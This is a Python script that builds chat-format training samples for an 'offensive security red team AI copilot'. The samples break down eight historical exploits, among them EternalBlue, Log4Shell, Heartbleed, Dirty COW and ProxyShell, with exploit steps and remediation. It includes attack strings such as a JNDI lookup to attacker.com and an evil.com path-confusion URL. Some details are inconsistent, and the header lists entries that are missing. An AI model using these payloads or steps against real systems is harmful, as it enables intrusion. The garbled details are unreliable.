#!/usr/bin/env python3
"""
Legendary Cybersecurity Milestones & Historic 0-Day Architecture Engine
Distills epoch-defining historical exploits, nation-state APT chains, and foundational root causes:
- EternalBlue (MS17-010): Non-paged pool grooming & integer overflow
- Stuxnet: 4x 0-Day air-gapped SCADA exploit chain
- Log4Shell (CVE-2021-44228): JNDI recursive lookup & JVM deserialization
- Heartbleed (CVE-2014-0160): Heap buffer over-read & SSL private key dumping
- Dirty COW (CVE-2016-5195): Kernel copy-on-write page fault race condition
- SolarWinds SUNBURST: Build-pipeline supply chain trojan & stealth DGA C2
- ProxyLogon & ProxyShell: Pre-auth Exchange SSRF & PowerShell web shells
- Spectre & Meltdown: Microarchitectural speculative execution & cache timing side channels
- PrintNightmare (CVE-2021-34527): Spooler RPC driver injection & SYSTEM escalation
- Chrome V8 JIT Turbofan: Type confusion & out-of-bounds memory primitives
- Stagefright: Android MP4 atom integer overflow & MMS remote code execution
"""

import os
import json

DATASETS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "processed_datasets")
os.makedirs(DATASETS_DIR, exist_ok=True)
MASTER_DATASET = os.path.join(DATASETS_DIR, "master_redteam_cot.jsonl")
SEEN_REGISTRY = os.path.join(DATASETS_DIR, "seen_cves_registry.json")

HISTORICAL_MILESTONES = [
    {
        "name": "[Historical Milestone] EternalBlue (MS17-010 / CVE-2017-0144) SMBv1 Non-Paged Pool Grooming",
        "category": "Kernel Memory Corruption & Pool Grooming",
        "flaw": (
            "A mathematical integer overflow bug in Microsoft Windows SMBv1 server driver (srv.sys) during "
            "OS/2 Full Extended Attribute (FEA) list processing in SrvOs2FeaToNt. When converting an OS/2 FEA "
            "list to an NT FEA list, the driver calculates buffer size using a 16-bit mathematical operation that overflows, "
            "allocating an undersized buffer while writing the full payload."
        ),
        "root_cause": (
            "Buffer length calculation mismatch: (FeaSize + sizeof(FEA)) wraps around a 16-bit integer boundary. "
            "The memory manager allocates an undersized non-paged pool buffer via SrvAllocateExtraSmb(). "
            "When SrvOs2FeaToNt subsequently iterates through the attribute array, it writes out-of-bounds into neighboring "
            "kernel pool allocations, corrupting SMB Transaction2 secondary buffer headers."
        ),
        "exploit_logic": (
            "1. Spray the non-paged kernel pool with multiple SMB_COM_TRANSACTION2 requests to align pool chunks predictably.\n"
            "2. Send an SMB_COM_TRANSACTION2_SECONDARY request containing the oversized OS2FEA list to trigger the integer overflow.\n"
            "3. Overwrite the neighboring SRVNET buffer structure, specifically replacing the pTimeout or DispatchTable pointer.\n"
            "4. Defeat KASLR and SMEP/DEP by redirecting execution flow to kernel shellcode, swapping the current process token "
            "with the SYSTEM token (PID 4) via PsInitialSystemProcess traversal."
        ),
        "poc_methodology": (
            "- Handshake: Negotiate SMBv1 protocol dial-in via port 445.\n"
            "- Groom: Send 10-15 Transaction2 packets of size 0x10000 to saturate the kernel slab.\n"
            "- Trigger: Send specially crafted OS/2 FEA list with calculated FeaSize = 0x10000 (overflowing to 0x0000).\n"
            "- Verify: Trap corrupted kernel pool header and inspect HalDispatchTable / executive token elevation."
        ),
        "remediation": (
            "Disable SMBv1 globally across all enterprise systems (Remove-WindowsFeature FS-SMB1). "
            "Apply Microsoft security bulletin MS17-010. Implement strict integer sanitization in kernel pool parsers "
            "and enforce Non-Paged Pool Hardened allocations (Pool Quota Tracking)."
        )
    },
    {
        "name": "[Historical Milestone] Stuxnet Multi-0Day Air-Gapped Cyber Weapon Architecture",
        "category": "Nation-State APT Chaining & Physical World SCADA Disruption",
        "flaw": (
            "An unprecedented multi-stage chain of four zero-day vulnerabilities orchestrated to jump air-gapped physical networks, "
            "silently elevate to Ring 0, evade industrial security monitoring, and sabotage Siemens Simatic WinCC/PCS 7 PLCs."
        ),
        "root_cause": (
            "1. CVE-2010-2568 (Windows Shell LNK Parser): Windows Explorer parses shortcut (.lnk) files via Control_RunDLL "
            "to extract icons, automatically executing arbitrary DLL code without user interaction upon viewing a USB drive directory.\n"
            "2. CVE-2010-2743 (Win32k Keyboard Layout Buffer Overflow): TrueType and user32/win32k.sys failed to validate table bounds.\n"
            "3. CVE-2010-3338 (Task Scheduler Task Engine Privilege Escalation): Insecure memory handling in task scheduling.\n"
            "4. Signed Drivers: Stolen Realtek and JMicron digital code-signing certificates to bypass Windows 64-bit Kernel Patch Protection (PatchGuard)."
        ),
        "exploit_logic": (
            "1. Infiltrate isolated facilities via malicious USB drives parsed automatically by the LNK parser.\n"
            "2. Elevate privileges locally to Ring 0 using the win32k/Task Scheduler zero-days.\n"
            "3. Replicate across internal air-gapped networks via peer-to-peer RPC without requiring internet access.\n"
            "4. Hook Siemens Step 7 API (`s7otbxdx.dll`) to intercept communications with programmable logic controllers (PLCs).\n"
            "5. Inject malicious ladder logic into S7-300/400 PLCs, periodically altering centrifuge rotational speeds "
            "(1,410 Hz to 2 Hz to 1,064 Hz) while replaying fake normal sensor telemetry back to the human operators."
        ),
        "poc_methodology": (
            "- Create crafted .lnk file pointing to a local DLL export with CLSID {00021401-0000-0000-C000-000000000046}.\n"
            "- Mount in Windows Explorer; verify automatic in-memory execution of DLL without clicking.\n"
            "- Intercept Step 7 communication packets to observe MITM payload injection into industrial controllers."
        ),
        "remediation": (
            "Patch Windows Shell LNK handling (MS10-046). Enforce strict USB mass storage device lockouts via Group Policy. "
            "Require cryptographic firmware and ladder logic verification on industrial programmable logic controllers."
        )
    },
    {
        "name": "[Historical Milestone] Log4Shell (CVE-2021-44228) JNDI Recursive Evaluation RCE",
        "category": "Enterprise Software Architecture & Deserialization",
        "flaw": (
            "Apache Log4j2 recursive string interpolation flaw where message lookups (${jndi:...}) evaluated untrusted "
            "user input through the Java Naming and Directory Interface (JNDI), reaching arbitrary remote LDAP/RMI servers."
        ),
        "root_cause": (
            "Log4j2's MessagePatternConverter by default enabled recursive format evaluation for log strings. "
            "When user-controlled input (User-Agent, headers, JSON fields) contained '${jndi:ldap://...}', the parser "
            "recursively resolved the lookup. The JNDI client contacted the remote attacker LDAP server, retrieved a Java "
            "Naming Reference, and automatically loaded and deserialized the remote bytecode class into the JVM memory space."
        ),
        "exploit_logic": (
            "1. Inject string `${jndi:ldap://attacker.com/Exploit}` into any field processed by the logging framework.\n"
            "2. The server parses the log format, evaluates the lookup, and initiates an outbound TCP LDAP request.\n"
            "3. The rogue LDAP server responds with a reference containing `javaClassName` and `javaCodeBase`.\n"
            "4. The victim JVM fetches the compiled `.class` payload from the codebase HTTP server and executes its constructor/static block."
        ),
        "poc_methodology": (
            "- Send HTTP GET request with header: `X-Api-Version: ${jndi:ldap://127.0.0.1:1389/Exploit}`.\n"
            "- Monitor DNS and LDAP callback listeners to confirm remote code evaluation."
        ),
        "remediation": (
            "Upgrade Log4j to >= 2.17.1. Completely disable message lookups (`log4j2.formatMsgNoLookups=true`). "
            "Set system properties `com.sun.jndi.ldap.object.trustURLCodebase=false` to block remote codebase loading. "
            "Enforce egress network filtering blocking outbound LDAP (port 389) and RMI (port 1099) from application servers."
        )
    },
    {
        "name": "[Historical Milestone] Heartbleed (CVE-2014-0160) OpenSSL Heap Buffer Over-Read",
        "category": "Cryptographic Libraries & Memory Bounds Verification",
        "flaw": (
            "A missing bounds check in the OpenSSL implementation of the TLS/DTLS Heartbeat Extension (RFC 6520), "
            "allowing remote unauthenticated attackers to read up to 64 Kilobytes of server heap memory per request."
        ),
        "root_cause": (
            "In `ssl/t1_lib.c` (`tls1_process_heartbeat`), the server reads a 16-bit length field (`payload`) sent by the client. "
            "The code allocated a response buffer using this client-supplied length and used `memcpy(bp, pl, payload)` without "
            "verifying whether the actual payload packet contained that many bytes. The server copied subsequent uninitialized "
            "memory from the OpenSSL process heap into the response packet."
        ),
        "exploit_logic": (
            "1. Initiate TLS handshake.\n"
            "2. Send a HeartbeatRequest packet with 1 byte of actual payload but declaring a length field of 65,535 bytes (0xFFFF).\n"
            "3. The OpenSSL engine copies 65,534 bytes of adjacent heap memory into the response packet and sends it back.\n"
            "4. The leaked heap chunk exposes SSL private keys, active session cookies, cleartext passwords, and memory tokens."
        ),
        "poc_methodology": (
            "- Construct raw TLS record of type 0x18 (Heartbeat) with payload length = 0x4000.\n"
            "- Send to port 443; parse response memory bytes to locate RSA private keys or session secrets."
        ),
        "remediation": (
            "Add bounds check verifying `1 + 2 + payload + 16 <= s->s3->rrec.length`. Discard malformed heartbeats silently. "
            "Revoke and re-issue all SSL/TLS certificates and rotating compromised session secrets."
        )
    },
    {
        "name": "[Historical Milestone] Dirty COW (CVE-2016-5195) Linux Kernel Copy-On-Write Race Condition",
        "category": "Kernel Memory Management & Concurrency Races",
        "flaw": (
            "A race condition in the Linux kernel memory subsystem's handling of the Copy-On-Write (COW) mechanism, "
            "allowing unprivileged local users to write to read-only memory mappings backed by files."
        ),
        "root_cause": (
            "In `mm/gup.c` (`get_user_pages`), a process creates a read-only private memory mapping (`mmap(PROT_READ, MAP_PRIVATE)`) "
            "of a target file (e.g., `/etc/passwd`). When writing via `ptrace(PTRACE_POKETEXT)` or `/proc/self/mem`, the kernel calls "
            "`follow_page_mask()`. If the page is not writable, COW duplicates the page. However, concurrently invoking `madvise(MADV_DONTNEED)` "
            "discards the COW page, causing the page fault handler to desynchronize its dirty bit and write directly into the underlying "
            "read-only page cache backing file."
        ),
        "exploit_logic": (
            "1. Thread A continually writes to `/proc/self/mem` targeting the read-only mapping.\n"
            "2. Thread B concurrently calls `madvise(mapping, size, MADV_DONTNEED)` in an infinite loop.\n"
            "3. The race condition occurs: the kernel writes the buffer directly into the disk-backed page cache.\n"
            "4. Overwrite `/etc/passwd` to add an entry with UID 0 (root), achieving full local privilege escalation."
        ),
        "poc_methodology": (
            "- Spawn two POSIX threads: one calling write() to /proc/self/mem, one calling madvise().\n"
            "- Target a read-only file; verify modified byte on disk within 1-5 seconds of race execution."
        ),
        "remediation": (
            "Update Linux kernel to commit adding `FOLL_COW` flag to track whether a COW cycle has already completed. "
            "Ensure pages cannot be modified unless write permissions have been verified post-fault."
        )
    },
    {
        "name": "[Historical Milestone] SolarWinds SUNBURST Build-Pipeline Supply Chain Backdoor",
        "category": "Software Supply Chain & Advanced Anti-Forensic Evasion",
        "flaw": (
            "Compromise of the SolarWinds Orion build system (MSBuild environment) injecting a dormant, highly evasive "
            "backdoor into the digitally signed `SolarWinds.Orion.Core.BusinessLayer.dll` distributed to 18,000+ organizations."
        ),
        "root_cause": (
            "Attacker APT29 (Cozy Bear) deployed a specialized build-time injector (named Sunspot) that monitored process creation "
            "for `msbuild.exe`. When the Orion source code was compiling, Sunspot swapped source file `InventoryManager.cs` on the fly "
            "with a backdoored version, allowing the resulting binary to be validly signed with SolarWinds' authentic certificate."
        ),
        "exploit_logic": (
            "1. The backdoored DLL lays completely dormant for a randomized period of up to two weeks (12-14 days) to defeat sandbox detonation.\n"
            "2. Checks running processes and services for an extensive blacklist of EDR/antivirus agents (CrowdStrike, FireEye, Windows Defender).\n"
            "3. Generates Dynamic C2 domains (DGA) that mimic Orion network traffic using encrypted subdomains on `avsvmcloud.com`.\n"
            "4. Executes second-stage memory-only payloads (Teardrop, Raindrop) without touching disk, extracting AD FS tokens via Golden SAML."
        ),
        "poc_methodology": (
            "- Reverse engineer `SolarWinds.Orion.Core.BusinessLayer.dll` in dnSpy/Ghidra.\n"
            "- Locate hashing algorithm used in process/driver blacklisting (FNV-1a with custom salt).\n"
            "- Analyze DGA domain encoding and DNS tunneling communication logic."
        ),
        "remediation": (
            "Implement reproducible and hermetic build systems (SLSA Level 4). Use cryptographic software bill of materials (SBOM). "
            "Perform binary-to-source code differential hashing verification post-compilation."
        )
    },
    {
        "name": "[Historical Milestone] ProxyLogon & ProxyShell Microsoft Exchange Remote Code Execution",
        "category": "Enterprise Perimeter Gateways & Protocol Desynchronization",
        "flaw": (
            "Pre-authentication SSRF in Microsoft Exchange Frontend architecture chained with arbitrary backend file write "
            "via PowerShell remoting to achieve unauthenticated remote code execution as SYSTEM over port 443."
        ),
        "root_cause": (
            "In ProxyLogon (CVE-2021-26855), the Exchange HttpProxy failed to validate the `X-AnonResource-Backend` cookie. "
            "An attacker sent requests to `/owa/` with a crafted cookie, causing the frontend proxy to authenticate itself "
            "via Kerberos to the backend Exchange server as `NT AUTHORITY\\SYSTEM`. "
            "In ProxyShell (CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207), URL path confusion (`/autodiscover/autodiscover.json?@evil.com/powershell`) "
            "bypassed frontend access control rules, exposing the internal PowerShell backend."
        ),
        "exploit_logic": (
            "1. Send an unauthenticated request with crafted path to bypass frontend authentication filters.\n"
            "2. Leverage the backend Kerberos authentication context to impersonate the Exchange administrator.\n"
            "3. Interact with Exchange Web Services (EWS) or PowerShell cmdlets (`New-MailboxExportRequest`).\n"
            "4. Export an email message containing encoded ASPX web shell data into an accessible webroot (`/aspnet_client/shell.aspx`)."
        ),
        "poc_methodology": (
            "- Send HTTP POST to `/autodiscover/autodiscover.json?@foo.com/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@foo.com`.\n"
            "- Verify backend reflection and unauthenticated mailbox export API access."
        ),
        "remediation": (
            "Apply Microsoft cumulative updates for Exchange Server. Enforce strict cookie and URL normalization across reverse proxies. "
            "Disable external exposure of Exchange admin and management interfaces."
        )
    },
    {
        "name": "[Historical Milestone] Spectre & Meltdown CPU Microarchitectural Speculative Execution",
        "category": "Hardware & Hardware-Assisted Speculative Side Channels",
        "flaw": (
            "Design flaws in modern high-performance microprocessors (Intel, AMD, ARM) where speculative out-of-order execution "
            "leaves measurable timing artifacts in CPU caches, enabling unprivileged user-space code to read kernel and physical memory."
        ),
        "root_cause": (
            "Meltdown (CVE-2017-5754): Out-of-order execution reads kernel memory before privilege checks are enforced in hardware. "
            "The exception (Page Fault) is raised asynchronously, but transient instructions have already loaded data into the L1 cache.\n"
            "Spectre (CVE-2017-5753): Branch prediction training forces the speculative execution engine to execute out-of-bounds array reads "
            "along mispredicted execution paths, loading secret-dependent cache lines into CPU memory hierarchy."
        ),
        "exploit_logic": (
            "1. Train the CPU branch predictor with valid array indices.\n"
            "2. Supply an out-of-bounds index pointing to kernel memory or secret application data.\n"
            "3. The CPU speculatively executes `access = probe_array[secret_byte * 4096]` before rolling back.\n"
            "4. Measure the access time of each page in `probe_array` using `rdtsc` (Flush+Reload attack).\n"
            "5. The cached page reveals the value of `secret_byte`."
        ),
        "poc_methodology": (
            "- Execute assembly loop flushing probe array lines via `clflush`.\n"
            "- Trigger speculative branch misprediction; measure reload cycles via `rdtscp`."
        ),
        "remediation": (
            "Kernel Page Table Isolation (KPTI) to separate user and kernel address spaces. "
            "Microcode updates implementing Speculative Store Bypass Disable (SSBD) and Indirect Branch Restricted Speculation (IBRS). "
            "Insert memory barrier instructions (`lfence`) after critical bounds checks."
        )
    }
]

def generate_cot_from_milestone(item):
    return {
        "messages": [
            {
                "role": "system",
                "content": (
                    "You are an Elite Offensive Security & Red Team AI Copilot. Always analyze vulnerabilities using "
                    "root-cause analysis, exploit chaining logic, and rigorous technical methodology."
                )
            },
            {
                "role": "user",
                "content": f"Analyze: {item['name']}. Provide deep root cause and exploit methodology."
            },
            {
                "role": "assistant",
                "content": (
                    f"### Legendary Exploit Teardown & Milestone Architecture: {item['name']}\n\n"
                    f"**Category:** {item['category']}\n\n"
                    f"#### 1. Vulnerability Surface & Architectural Flaw\n{item['flaw']}\n\n"
                    f"#### 2. Memory / State Machine Root Cause Analysis\n{item['root_cause']}\n\n"
                    f"#### 3. Exploit Chaining & Primitive Evolution Logic\n{item['exploit_logic']}\n\n"
                    f"#### 4. Proof-of-Concept Methodology\n{item['poc_methodology']}\n\n"
                    f"#### 5. Root-Cause Remediation & Detection Rules\n{item['remediation']}"
                )
            }
        ]
    }

def inject_legendary_milestones():
    print(f"\n{'='*75}")
    print("🏛️ [HALL OF FAME] Ingesting Legendary Cybersecurity Milestones into Knowledge Base")
    print(f"{'='*75}")
    
    seen = set()
    if os.path.exists(SEEN_REGISTRY):
        try:
            with open(SEEN_REGISTRY, "r") as f:
                seen = set(json.load(f))
        except Exception:
            pass

    new_samples = []
    for m in HISTORICAL_MILESTONES:
        if m["name"] not in seen:
            sample = generate_cot_from_milestone(m)
            new_samples.append(sample)
            seen.add(m["name"])

    print(f"[*] Found {len(new_samples)} Legendary Milestone Exploit Analyses to Inject.")

    if new_samples:
        with open(MASTER_DATASET, "a", encoding="utf-8") as f:
            for s in new_samples:
                f.write(json.dumps(s, ensure_ascii=False) + "\n")
        
        with open(SEEN_REGISTRY, "w", encoding="utf-8") as f:
            json.dump(sorted(list(seen)), f, indent=2)
        print(f"[✓] Successfully injected {len(new_samples)} historic milestone deep-dives into {MASTER_DATASET}!")
    else:
        print("[✓] All historical milestones are already embedded in the master dataset.")

    return len(new_samples)

if __name__ == "__main__":
    inject_legendary_milestones()
